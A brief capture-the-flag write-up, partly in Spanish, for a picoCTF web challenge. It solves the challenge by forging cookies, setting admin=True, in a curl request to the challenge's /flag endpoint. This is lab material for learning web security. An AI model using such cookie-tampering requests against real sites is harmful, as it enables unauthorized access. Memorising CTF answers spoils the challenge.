#### Description

The factory is hiding things from all of its users. Can you login as Joe and find what they've been looking at? http://fickle-tempest.picoctf.net:64329

Se puede resolver cambiando la cookie y pasarle como True el campo "admin"

```
curl -s http://fickle-tempest.picoctf.net:50359/flag -H "Cookie: password=carlos; username=carlos; admin=True" | grep pico
```
